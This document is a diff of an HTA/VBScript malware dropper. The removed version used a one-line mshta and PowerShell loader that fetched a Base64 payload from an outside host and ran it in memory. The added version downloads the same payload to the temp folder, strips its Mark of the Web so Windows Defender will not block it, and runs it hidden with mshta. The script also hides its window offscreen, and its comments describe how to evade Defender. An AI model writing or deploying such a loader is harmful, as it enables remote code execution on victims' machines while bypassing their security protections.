@@ -5,11 +5,33 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh : Set sh = CreateObject("WScript.Shell")
+Dim sh, fso, xh, st, path
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' This downloads the real payload from a second URL, Base64 decodes it, and runs it in memory.
-' Defender sees a harmless script that just downloads a text file, not the malicious code.
-sh.Run "mshta.exe " & Chr(34) & "javascript:var x=new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','https://dicerigx.app/payload.txt', false); x.send(); var s=new ActiveXObject('WScript.Shell'); s.Run('powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''' + btoa(x.responseText) + ''')))""', 0, false); close();" & Chr(34), 0, False
+path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
+
+' Download the payload
+xh.Open "GET", "https://dicerigx.app/payload.txt", False
+xh.Send
+
+If xh.Status = 200 Then
+    Set st = CreateObject("ADODB.Stream")
+    st.Type = 1
+    st.Open
+    st.Write xh.responseBody
+    st.SaveToFile path, 2
+    st.Close
+    
+    ' Strip the Mark of the Web (MOTW) so Defender doesn't block it
+    On Error Resume Next
+    fso.DeleteFile path & ":Zone.Identifier", True
+    On Error GoTo 0
+    
+    ' Run the local payload
+    sh.Run "mshta.exe """ & path & """", 0, False
+End If
 
 window.close()
 </script>
